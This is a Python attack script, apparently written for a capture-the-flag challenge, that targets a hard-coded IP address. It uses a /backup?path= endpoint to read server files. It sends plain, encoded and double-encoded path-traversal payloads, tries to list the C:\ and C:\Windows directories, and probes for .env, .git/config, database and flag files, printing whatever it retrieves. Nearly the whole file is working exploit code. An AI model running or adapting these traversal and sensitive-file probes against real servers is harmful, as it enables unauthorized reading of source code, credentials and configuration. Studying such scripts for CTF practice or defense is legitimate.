import requests
import re

requests.packages.urllib3.disable_warnings()

TARGET = "http://119.29.238.216:8088"
TIMEOUT = 15

session = requests.Session()
session.verify = False
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
})
session.proxies = {}


def read_app_source():
    """尝试读取app.py源码"""
    print("尝试读取app.py源码...")
    
    backup_url = f"{TARGET}/backup"
    
    # 从之前的测试发现路径是 F:\small peoject\python-lab\
    paths = [
        "F:\\small peoject\\python-lab\\app.py",
        "F:\\small peoject\\python-lab\\main.py",
        "F:\\small peoject\\python-lab\\server.py",
        "F:\\small peoject\\python-lab\\ctf.py",
    ]
    
    for path in paths:
        try:
            r = session.get(backup_url, params={"path": path}, timeout=TIMEOUT)
            
            if r.status_code == 200:
                body_match = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
                if body_match:
                    body_content = body_match.group(1)
                    
                    if "Blocked" not in body_content and len(body_content) > 50:
                        print(f"\n  找到源码: {path}")
                        print(f"  {'='*80}")
                        print(body_content)
                        print(f"  {'='*80}")
                        
                        flag_match = re.search(r'flag\{[^}]+\}', body_content, re.IGNORECASE)
                        if flag_match:
                            print(f"\n  🚩 FLAG FOUND: {flag_match.group(0)}")
                        return
                        
        except Exception as e:
            print(f"  错误: {e}")


def test_path_traversal():
    """测试路径遍历漏洞"""
    print("\n测试路径遍历漏洞...")
    
    backup_url = f"{TARGET}/backup"
    
    traversal_payloads = [
        # 相对路径遍历
        "F:\\small peoject\\python-lab\\uploads\\..\\app.py",
        "F:\\small peoject\\python-lab\\uploads/../app.py",
        "F:\\small peoject\\python-lab\\uploads\\..\\..\\..\\flag.txt",
        "F:\\small peoject\\python-lab\\uploads/../../../../flag.txt",
        # 编码路径遍历
        "F:\\small peoject\\python-lab\\uploads%5c..%5capp.py",
        "F:\\small peoject\\python-lab\\uploads%2f..%2fapp.py",
        # 双重编码
        "F:\\small peoject\\python-lab\\uploads%255c..%255capp.py",
        "F:\\small peoject\\python-lab\\uploads%252f..%252fapp.py",
        # 绝对路径遍历
        "../../../../app.py",
        "../app.py",
        "./../app.py",
        # 使用..的变体
        "F:\\small peoject\\python-lab\\uploads\\%2e%2e\\app.py",
        "F:\\small peoject\\python-lab\\uploads/%2e%2e/app.py",
        "F:\\small peoject\\python-lab\\uploads\\%252e%252e\\app.py",
        "F:\\small peoject\\python-lab\\uploads/%252e%252e/app.py",
    ]
    
    for payload in traversal_payloads:
        try:
            r = session.get(backup_url, params={"path": payload}, timeout=TIMEOUT)
            
            if r.status_code == 200:
                body_match = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
                if body_match:
                    body_content = body_match.group(1)
                    
                    if "Blocked" not in body_content and len(body_content) > 50:
                        print(f"\n  [{r.status_code}] ?path={payload}")
                        print(f"     响应: {body_content[:500]}")
                        
                        flag_match = re.search(r'flag\{[^}]+\}', body_content, re.IGNORECASE)
                        if flag_match:
                            print(f"\n     🚩 FLAG FOUND: {flag_match.group(0)}")
                            return
                            
        except Exception as e:
            pass


def test_directory_listing():
    """测试目录列表"""
    print("\n测试目录列表...")
    
    backup_url = f"{TARGET}/backup"
    
    directories = [
        "F:\\",
        "F:\\small peoject",
        "F:\\small peoject\\python-lab",
        "C:\\",
        "C:\\Users",
        "C:\\Windows",
    ]
    
    for path in directories:
        try:
            r = session.get(backup_url, params={"path": path}, timeout=TIMEOUT)
            
            if r.status_code == 200:
                body_match = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
                if body_match:
                    body_content = body_match.group(1)
                    
                    if "Blocked" not in body_content and len(body_content) > 20:
                        print(f"\n  [{r.status_code}] ?path={path}")
                        print(f"     响应: {body_content[:500]}")
                        
                        flag_match = re.search(r'flag\{[^}]+\}', body_content, re.IGNORECASE)
                        if flag_match:
                            print(f"\n     🚩 FLAG FOUND: {flag_match.group(0)}")
                            return
                            
        except Exception as e:
            pass


def test_full_source():
    """尝试获取完整源码"""
    print("\n尝试获取完整源码...")
    
    # 尝试访问各种可能的源码路径
    source_paths = [
        "/source",
        "/source.py",
        "/app.py",
        "/main.py",
        "/server.py",
        "/index.py",
        "/ctf.py",
        "/readme.txt",
        "/.git/HEAD",
        "/.git/config",
        "/.env",
        "/config.py",
        "/database.db",
        "/flag.txt",
        "/secret.txt",
        "/api/source",
        "/admin/source",
        "/debug/source",
        "/dev/source",
    ]
    
    for path in source_paths:
        url = f"{TARGET}{path}"
        try:
            r = session.get(url, timeout=TIMEOUT)
            
            if r.status_code == 200:
                content = r.text[:800]
                
                print(f"\n  [{r.status_code}] {path}")
                print(f"     Content-Type: {r.headers.get('Content-Type', '')}")
                
                if len(content) > 50:
                    print(f"     内容: {content}")
                    
                    flag_match = re.search(r'flag\{[^}]+\}', content, re.IGNORECASE)
                    if flag_match:
                        print(f"\n     🚩 FLAG FOUND: {flag_match.group(0)}")
                        return
                        
        except Exception as e:
            pass


def main():
    print("*" * 70)
    print("  CTF源码读取测试")
    print("  目标: " + TARGET)
    print("*" * 70)
    
    read_app_source()
    test_path_traversal()
    test_directory_listing()
    test_full_source()
    
    print("\n" + "*" * 70)
    print("  测试完成")
    print("*" * 70)


if __name__ == "__main__":
    main()